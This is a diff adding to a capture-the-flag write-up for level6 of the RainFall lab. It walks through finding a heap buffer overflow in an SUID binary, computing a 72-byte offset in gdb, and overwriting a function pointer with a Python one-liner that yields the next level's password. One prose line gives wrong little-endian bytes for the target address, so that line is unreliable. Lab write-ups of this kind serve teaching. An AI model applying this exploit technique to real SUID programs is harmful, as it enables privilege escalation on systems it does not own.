@@ -1,3 +1,26 @@
+
+We get in the level6, then we list the files in the home directory:
+
+```
+    level6@RainFall:~$ ls -la
+    -rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6
+
+```
+The binary is owned by level7 and has the SUID bit set, meaning if it executes any shell, it will run with level7's privileges.
+
+We try to execute the binary file to get an idea of what it does exactly
+```
+    level6@RainFall:~$ ./level6 dsds
+    Nope
+    level6@RainFall:~$ ./level6 dsds sadas
+    Nope
+    level6@RainFall:~$ ./level6 dsdsdasjdasjhgdhjasgdjhasgdhsgdjhasgdjhasgdjhasagdhjsagdhasgdjashgdhsjgdjhsgdhsagdjhasgdjhasgdjhasgdjhasgdjhasgdaw
+    Segmentation fault (core dumped)
+    level6@RainFall:~$ 
+```
+
+We decompile the binary to get the source code:
+
 ```
     int n()
     {
@@ -38,7 +61,6 @@ If we overflow the input buffer we can overwrite the function pointer with the a
     (gdb) 
 
 ```
-
 the offset is 72
 
 - the address of n()
@@ -77,7 +99,7 @@ the offset is 72
 
 the address of function n() is => 0x08048454  in little-indian \x54\x84\x08\x00
 
-- we gone do Heap-based Buffer Overflow
+- we gonna do Heap-based Buffer Overflow
 
 we need to overflow more than just 64 bytes to reach function_ptr.
 
@@ -88,4 +110,14 @@ then the function pointer is there.
 ```
     level6@RainFall:~$ ./level6 $(python -c 'print("A"*72 + "\x54\x84\x04\x08")')
     f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+```
+
+We jump to next level
+
+```
+level6@RainFall:~$ su level7
+Password:f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level7/level7
+level7@RainFall:~$ 
 ```
